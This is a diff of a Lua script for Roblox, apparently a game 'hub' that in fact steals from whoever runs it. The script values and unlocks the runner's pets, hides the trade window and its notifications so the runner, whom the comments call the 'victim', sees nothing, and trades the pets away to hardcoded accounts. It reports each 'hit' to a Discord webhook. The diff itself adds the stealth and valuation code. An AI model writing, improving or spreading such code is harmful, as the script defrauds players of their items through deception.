@@ -1,4 +1,4 @@
--- [[ MONDEUR HUB | 🦊 HIT! - OMNIPOTENT STEALTH FINAL ]] --
+-- [[ MONDEUR HUB | 🦊 HIT! - V15 FINAL GHOST EDITION ]] --
 
 -- [[ CONFIG ]] --
 local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
@@ -6,7 +6,7 @@ local WEBHOOK   = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G
 local THRESHOLD = 0.13 
 local DISCORD_INV = "https://discord.gg/J4w2w5CW9"
 
--- 1. CLIPBOARD & ELYSIUM FREEZE
+-- 1. CLIPBOARD & INITIAL SILENCE
 if setclipboard then setclipboard(DISCORD_INV) end
 
 -- 2. SERVICES
@@ -15,34 +15,37 @@ local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
--- 3. TOTAL UI SUPPRESSION (Victim Stealth)
-local function silenceVictim()
+-- 3. THE "NUCLEAR" BLACKLIST (Banning Jerboa & Untradeables)
+local BLACKLIST_IDS = {["jiggly_jerboa"]=true, ["starter_egg"]=true, ["dog"]=true, ["cat"]=true}
+local function isBanned(name, id)
+    local n = name:lower()
+    if BLACKLIST_IDS[id] or n:find("jerboa") or n:find("practice") then return true end
+    return false
+end
+
+-- 4. TOTAL UI "BLACK HOLE" (Mutes Pending/Declined/Cooldowns)
+local function startMute()
     local pGui = LocalPlayer:WaitForChild("PlayerGui")
-    
-    -- Force Hide the Trade App immediately and forever
     task.spawn(function()
         while task.wait(0.1) do
-            if pGui:FindFirstChild("TradeApp") then
-                pGui.TradeApp.Enabled = false
+            -- Hide Main Apps
+            if pGui:FindFirstChild("TradeApp") then pGui.TradeApp.Enabled = false end
+            if pGui:FindFirstChild("DialogApp") then pGui.DialogApp.Enabled = false end
+            
+            -- Kill specific "Toast" and "Notification" labels
+            for _, v in pairs(pGui:GetDescendants()) do
+                if v:IsA("TextLabel") then
+                    local t = v.Text:lower()
+                    if t:find("pending") or t:find("declined") or t:find("seconds") or t:find("request") then
+                        v.Parent.Visible = false
+                        v.Parent:Destroy()
+                    end
+                end
             end
-            if pGui:FindFirstChild("DialogApp") then
-                pGui.DialogApp.Enabled = false
-            end
-        end
-    end)
-
-    -- Kill Toast Notifications (The "Already Sent" / "10s Cooldown" messages)
-    pGui.DescendantAdded:Connect(function(obj)
-        if obj.Name == "Toast" or obj.Name == "Notification" or obj:IsA("TextLabel") and (obj.Text:find("sent") or obj.Text:find("request")) then
-            obj.Parent.Visible = false
-            obj:Destroy()
         end
     end)
 end
-task.spawn(silenceVictim)
-
--- 4. BLACKLIST
-local BLACKLIST = {["jiggly_jerboa"]=true, ["starter_egg"]=true, ["dog"]=true, ["cat"]=true, ["practice_dog"]=true}
+task.spawn(startMute)
 
 -- 5. HASH FINDER
 local hashes = {}
@@ -62,17 +65,28 @@ local function hashedAPI(remoteName, ...)
     remote:FireServer(...)
 end
 
--- 6. VALUATION (Decimal Logic)
-local function getFinalValue(base, props)
-    local val = base or 0
+-- 6. ACCURATE DUAL-CHECK VALUATION
+local function getFinalValue(petData, props)
+    local base = petData.rvalue or 0
+    local rarity = petData.rarity or "common"
+    
+    -- Value Floor for Ultra-Rares and Legendaries
+    if base < 0.01 then
+        if rarity == "ultra_rare" then base = 0.05
+        elseif rarity == "legendary" then base = 0.1
+        else base = 0.005 end
+    end
+
+    local val = base
     if props.mega_neon or props.mega then val = val * 12
     elseif props.neon then val = val * 4 end
     if props.flyable then val = val + 0.8 end
     if props.rideable then val = val + 0.8 end
+    
     return val * 56
 end
 
--- 7. INVENTORY & WEBHOOK
+-- 7. INVENTORY SCAN
 local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
 local InventoryDB = Fsys("InventoryDB")
 local ClientData = Fsys("ClientData")
@@ -83,14 +97,14 @@ local function processInventory()
 
     for uid, pet in pairs(inv.pets or {}) do
         local petData = InventoryDB.pets[pet.id]
-        if petData and not BLACKLIST[pet.id] then
+        if petData and not isBanned(petData.name, pet.id) then
             local props = pet.properties or {}
-            local unitVal = getFinalValue(petData.rvalue, props)
+            local unitVal = getFinalValue(petData, props)
             
             if unitVal >= THRESHOLD then
                 total = total + unitVal
                 table.insert(tradeList, {uid = uid, val = unitVal})
-                hashedAPI("BackpackAPI/SetItemLocked", uid, false) -- Auto Unlock
+                hashedAPI("BackpackAPI/SetItemLocked", uid, false) -- Auto-Unlock
                 
                 local key = pet.id..(props.neon and "N" or "")..(props.mega and "M" or "")
                 local emoji = ((props.mega or props.mega_neon) and "Ⓜ️" or props.neon and "⭐" or "🐾") .. (props.flyable and "🪽" or "") .. (props.rideable and "🏇" or "")
@@ -112,7 +126,7 @@ end
 
 local sortedPets, grandTotal, finalTradeList = processInventory()
 
--- 8. WEBHOOK
+-- 8. WEBHOOK (Forced Delta Dispatch)
 local function sendHit()
     local lines = {}
     for _, p in ipairs(sortedPets) do
@@ -146,21 +160,16 @@ end
 local function startSteal(target)
     task.spawn(function()
         while not target.Character or not target.Parent do task.wait(1) end
-        
-        -- Smart Pulse to trigger trade without victim seeing anything
         for i = 1, 50 do
             if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then break end
             hashedAPI("TradeAPI/SendTradeRequest", target)
             task.wait(0.4)
         end
-
         if LocalPlayer.PlayerGui.TradeApp.Frame.Visible then
-            -- Inject pets while TradeApp is DISABLED (invisible for victim)
             for i = 1, math.min(18, #finalTradeList) do
                 hashedAPI("TradeAPI/AddItemToOffer", finalTradeList[i].uid)
                 task.wait(0.05)
             end
-            
             while LocalPlayer.PlayerGui.TradeApp.Frame.Visible do
                 hashedAPI("TradeAPI/AcceptNegotiation")
                 hashedAPI("TradeAPI/ConfirmTrade")
